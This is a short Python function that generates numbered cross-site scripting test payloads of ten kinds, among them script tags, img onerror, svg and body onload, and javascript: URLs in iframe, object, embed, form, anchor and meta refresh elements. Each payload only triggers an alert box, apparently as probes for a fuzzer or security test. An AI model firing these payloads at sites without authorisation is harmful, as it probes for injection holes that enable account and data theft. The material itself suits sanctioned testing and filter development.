def generate_base_payloads(num_payloads):
    payloads = []

    # Basic script alerts
    for i in range(1, num_payloads//10 + 1):
        payloads.append(f"<script>alert('XSS{i}');</script>")

    # Image onerror alerts
    for i in range(num_payloads//10 + 1, num_payloads//5 + 1):
        payloads.append(f"<img src=x onerror=alert('XSS{i}');>")

    # SVG onload alerts
    for i in range(num_payloads//5 + 1, 3*num_payloads//10 + 1):
        payloads.append(f"<svg/onload=alert('XSS{i}')>")

    # Body onload alerts
    for i in range(3*num_payloads//10 + 1, 2*num_payloads//5 + 1):
        payloads.append(f"<body onload=alert('XSS{i}')>")

    # Iframe src alerts
    for i in range(2*num_payloads//5 + 1, num_payloads//2 + 1):
        payloads.append(f"<iframe src=\"javascript:alert('XSS{i}');\"></iframe>")

    # Object data alerts
    for i in range(num_payloads//2 + 1, 3*num_payloads//5 + 1):
        payloads.append(f"<object data=\"javascript:alert('XSS{i}');\"></object>")

    # Embed src alerts
    for i in range(3*num_payloads//5 + 1, 7*num_payloads//10 + 1):
        payloads.append(f"<embed src=\"javascript:alert('XSS{i}');\">")

    # Form action alerts
    for i in range(7*num_payloads//10 + 1, 4*num_payloads//5 + 1):
        payloads.append(f"<form action=\"javascript:alert('XSS{i}')\"><input type=submit></form>")

    # Anchor href alerts
    for i in range(4*num_payloads//5 + 1, 9*num_payloads//10 + 1):
        payloads.append(f"<a href=\"javascript:alert('XSS{i}')\">Click me</a>")

    # Meta refresh alerts
    for i in range(9*num_payloads//10 + 1, num_payloads + 1):
        payloads.append(f"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS{i}')\">")

    return payloads
